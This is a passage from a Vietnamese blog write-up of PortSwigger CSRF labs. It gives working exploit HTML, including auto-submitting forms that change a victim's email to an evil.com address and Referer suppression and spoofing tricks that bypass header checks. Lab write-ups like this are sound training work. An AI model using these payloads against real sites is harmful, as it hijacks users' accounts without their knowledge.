class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/rJv5xO4l-l.png" alt="image"></p>
<p>Thành công solve lab, tại exploit ta sẽ phải gửi 2 lần lý do là vì SameSite default có lỗ hổng ở chrome browser khi đến bước SSO thì chrome sẽ không kiểm tra cookie trong 120 giây trong khoảng thời gian đó ta lợi dụng được fresh cookie gửi đi payload và khi victim ấn vào thì nó sẽ tiến hành đổi email ở phía server.</p>
<h3 id="Lab-CSRF-where-Referer-validation-depends-on-header-being-present"><a href="#Lab-CSRF-where-Referer-validation-depends-on-header-being-present" class="headerlink" title="Lab: CSRF where Referer validation depends on header being present"></a>Lab: CSRF where Referer validation depends on header being present</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br><span class="line"></span><br><span class="line">Hint</span><br><span class="line">You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/ryEvQONg-g.png" alt="image"></p>
<p>Ta vẫn có chức năng update email như cũ bây giờ ta tiến hành update và lấy request của nó để phân tích.</p>
<p><img src="https://hackmd.io/_uploads/SJDCXd4ebl.png" alt="image"></p>
<p>Ta để ý rằng ở đây không hề có token csrf nên dễ bị tấn công, Server cố gắng chống CSRF bằng cách kiểm tra Referer header:</p>
<ul>
<li><p>Nếu Referer khác domain → từ chối.</p>
</li>
<li><p>Nhưng nếu không có Referer header → lại chấp nhận (fallback insecure).</p>
</li>
</ul>
<p>Ta sẽ thử sửa cái domain ở trường Referer để xem kết quả nó có đúng như ta nghĩ không.</p>
<p><img src="https://hackmd.io/_uploads/HJ6BNdVgZl.png" alt="image"></p>
<p>Rồi ăn chửi rồi, bây giờ nếu ta xoá luôn nó đi thì sẽ như thế nào.</p>
<p><img src="https://hackmd.io/_uploads/S1WuNu4e-g.png" alt="image"></p>
<p>Response thành công trả về 302, nó chấp nhận request của ta mặc dù không còn trường Referer nữa. Điều này chứng minh: cơ chế phòng thủ chỉ kiểm tra khi header tồn tại, còn nếu không có thì bỏ qua.</p>
<p>Bây giờ dựa vào đó ta sẽ tạo một payload Suppress Referer bằng HTML meta tag.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a7600bd04925cac806c5394009300d1.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phatmaiii@evil.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/rkLGSdNxbe.png" alt="image"></p>
<p>Store payload và gửi nó đến cho victim khi victim bấm vào request đổi email sẽ được thực thi đến server.</p>
<p><img src="https://hackmd.io/_uploads/Sk3NH_VgZg.png" alt="image"></p>
<p>Thành công solve lab này.</p>
<h3 id="Lab-CSRF-with-broken-Referer-validation"><a href="#Lab-CSRF-with-broken-Referer-validation" class="headerlink" title="Lab: CSRF with broken Referer validation"></a>Lab: CSRF with broken Referer validation</h3><p>Đây là lab cuối cùng của CSRF.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">This lab&#x27;s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.</span><br><span class="line"></span><br><span class="line">To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&#x27;s email address.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br><span class="line"></span><br><span class="line">Hint</span><br><span class="line">You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/r1lxL_Vx-g.png" alt="image"></p>
<p>Ta vẫn sẽ có chức năng update email như bao lab trước bây giờ như cũ ta vẫn sẽ lấy request update email để phân tích và tìm cách để tạo payload.</p>
<p><img src="https://hackmd.io/_uploads/HklD8uVgWe.png" alt="image"></p>
<p>Ok ở đây ta có kịch bản khá là giống bài lab trước bây giờ ta sẽ thử xoá luôn trường Referer xem kết quả ra sao.</p>
<p><img src="https://hackmd.io/_uploads/rJs5UdExWe.png" alt="image"></p>
<p>Ok ăn chửi rồi thế với trường hợp ta thử sửa domain trong trường referer thì sao?</p>
<p><img src="https://hackmd.io/_uploads/SkICUuVe-l.png" alt="image"></p>
<p>Hmm khi ta sửa vớ vẩn thì cũng bị dính lỗi, ở đây ta để ý rằng request hợp lệ khi nó là một domain vậy câu hỏi ở đây là nếu ta thử vứt vào một đường dẫn là domain fake thì sao ta?</p>
<p><img src="https://hackmd.io/_uploads/H1Yrvu4l-e.png" alt="image"></p>
<p>Ồ vậy là tuy đã fix được lỗi trước nhưng ở đây có vẻ anh dev đã không validate lại đoạn domain nên nếu ta bỏ vào domain nào thì nó cũng cho là hợp lệ và cho phép thực thi được update email, ở đây tôi sửa nó thành <code>Referer: https://testdomain.net?0a5400f903eb547480aa17e7006900ad.web-security-academy.net/my-account?id=wiener</code> và bypass được filter.</p>
<p>Bây giờ dựa vào tình huống trên ta sẽ tạo exploit code.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;unsafe-url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    history.<span class="title function_">pushState</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;/?0a5400f903eb547480aa17e7006900ad.web-security-academy.net&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0a5400f903eb547480aa17e7006900ad.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phathacker@evil.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/rkThddEgWg.png" alt="image"></p>
<p>Thành công solve lab này là cũng là lab cuối cùng kết thúc chuỗi challenge CSRF.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/">https://pzhat.github.io/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/PortSwigger/">PortSwigger</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Ysoserial Commons Collections 5 Analyst</div></div><div class="info-2"><div class="info-item-1">Ysoserial Commons Collections 5 AnalystTổng quan CommonsCollections 5 trong YsoserialCommonsCollections là một trong những gadget chain nổi tiếng nhất trong các cuộc tấn công khai thác Java deserialization không an toàn, đặc biệt khi ứng dụng sử dụng thư viện Apache Commons Collections. Trong bài viết này, chúng ta sẽ tập trung vào CommonsCollections5 (CC5) — một trong các chain được tích hợp sẵn trong công cụ ysoserial . Mình chọn phân tích CC5 vì đây là chain được nhiều người đề xuất để học...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Tryhackme Basic Pentesting Challenge</div></div><div class="info-2"><div class="info-item-1">Tryhackme Basic Pentesting Challenge Sử dụng nmap để scan các port đang mở của target ở đây tôi sử dụng lệnh nmap -sV -T4 &lt;ip&gt; để scan cho nhanh và ta nhận được kết quả là 4 port đang mở. Với câu hỏi đầu là What is the name of the hidden directory on the web server ta sẽ tiến hành scan directory bằng gobuster ở đâu mình dùng lệnh :  1gobuster dir -u http://10.10.237.96 -w /usr/share/wordlists/dirb/common.txt -t 20 -x php,html,txt   Ta tìm được directory hidden đó là /development và trả ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-25</div><div class="info-item-2">GraphQL API Vulnerability</div></div><div class="info-2"><div class="info-item-1">GraphQL API Vulnerability PortSwigger ChallengeOverview về GraphQLGraphQL là một ngôn ngữ truy vấn cho API (Query Language for APIs) và cũng là một môi trường thực thi phía máy chủ (server-side runtime) để thực hiện các truy vấn đó. Để dễ hiểu hãy hình dung như sau:   Với API truyền thống (như REST API): Bạn phải gọi nhiều &quot;endpoint&quot;(đường dẫn) khác nhau để lấy các loại dữ liệu khác nhau.  Ví dụ: để lấy thông tin người dùng và các bài viết của họ, bạn có thể phải gọi &#x2F;users&#x2...</div></div></div></a><a class="pagination-related" href="/2025/11/16/2025-11-16-CORS-PortSwigger/" title="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-16</div><div class="info-item-2">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUpOverview về CORSCORS là gì? Vì sao lại xuất hiện CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật trong web cho phép các tài nguyên trên một máy chủ được chia sẻ với các trang web có nguồn (origin) khác. “Nguồn” ở đây được định nghĩa bởi ba yếu tố: giao thức (http, https), tên miền (domain), và cổng (port).  Theo mặc định, các trình duyệt web tuân thủ Chính sách Cùng Nguồn Gốc (Same-Origin Policy - SOP). Chính sách nà...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PortSwigger-CSRF-Challenge-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">PortSwigger CSRF Challenge WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gioi-thieu-ve-CSRF-Cross-Site-Request-Forgery"><span class="toc-number">1.1.</span> <span class="toc-text">Giới thiệu về CSRF (Cross-Site Request Forgery)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lo-hong-CSRF-la-gi"><span class="toc-number">1.1.1.</span> <span class="toc-text">Lỗ hổng CSRF là gì :</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF-hoat-dong-nhu-the-nao"><span class="toc-number">1.1.2.</span> <span class="toc-text">CSRF hoạt động như thế nào :</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tai-sao-lo-hong-nay-ton-tai"><span class="toc-number">1.1.3.</span> <span class="toc-text">Tại sao lỗ hổng này tồn tại :</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-WriteUp"><span class="toc-number">1.2.</span> <span class="toc-text">Challenge WriteUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-vulnerability-with-no-defenses"><span class="toc-number">1.3.</span> <span class="toc-text">Lab: CSRF vulnerability with no defenses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-where-token-validation-depends-on-request-method"><span class="toc-number">1.4.</span> <span class="toc-text">Lab: CSRF where token validation depends on request method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-where-token-validation-depends-on-token-being-present"><span class="toc-number">1.5.</span> <span class="toc-text">Lab: CSRF where token validation depends on token being present</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-where-token-is-not-tied-to-user-session"><span class="toc-number">1.6.</span> <span class="toc-text">Lab: CSRF where token is not tied to user session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-where-token-is-tied-to-non-session-cookie"><span class="toc-number">1.7.</span> <span class="toc-text">Lab: CSRF where token is tied to non-session cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-where-token-is-duplicated-in-cookie"><span class="toc-number">1.8.</span> <span class="toc-text">Lab: CSRF where token is duplicated in cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SameSite-Lax-bypass-via-method-override"><span class="toc-number">1.9.</span> <span class="toc-text">Lab: SameSite Lax bypass via method override</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SameSite-Strict-bypass-via-client-side-redirect"><span class="toc-number">1.10.</span> <span class="toc-text">Lab: SameSite Strict bypass via client-side redirect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SameSite-Strict-bypass-via-sibling-domain"><span class="toc-number">1.11.</span> <span class="toc-text">Lab: SameSite Strict bypass via sibling domain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-SameSite-Lax-bypass-via-cookie-refresh"><span class="toc-number">1.12.</span> <span class="toc-text">Lab: SameSite Lax bypass via cookie refresh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-where-Referer-validation-depends-on-header-being-present"><span class="toc-number">1.13.</span> <span class="toc-text">Lab: CSRF where Referer validation depends on header being present</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-CSRF-with-broken-Referer-validation"><span class="toc-number">1.14.</span> <span class="toc-text">Lab: CSRF with broken Referer validation</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</a><time datetime="2026-01-31T17:12:36.483Z" title="Created 2026-02-01 00:12:36">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/2026-01-27-CVE-2025-14770/" title="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</a><time datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/2026-01-21-Ysoserial-CC3-Analyst/" title="Ysoserial Common Collections 3 Analyst (CC3)">Ysoserial Common Collections 3 Analyst (CC3)</a><time datetime="2026-01-21T05:35:18.206Z" title="Created 2026-01-21 12:35:18">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/31/2025-12-31-SSTI-Velocity/" title="Velocity Server Side Template Injection Challenge">Velocity Server Side Template Injection Challenge</a><time datetime="2025-12-31T04:43:06.549Z" title="Created 2025-12-31 11:43:06">2025-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/25/2025-12-25-CBJS-Misconfiguration/" title="CBJS Java Misconfiguration Challenge">CBJS Java Misconfiguration Challenge</a><time datetime="2025-12-25T13:30:27.815Z" title="Created 2025-12-25 20:30:27">2025-12-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>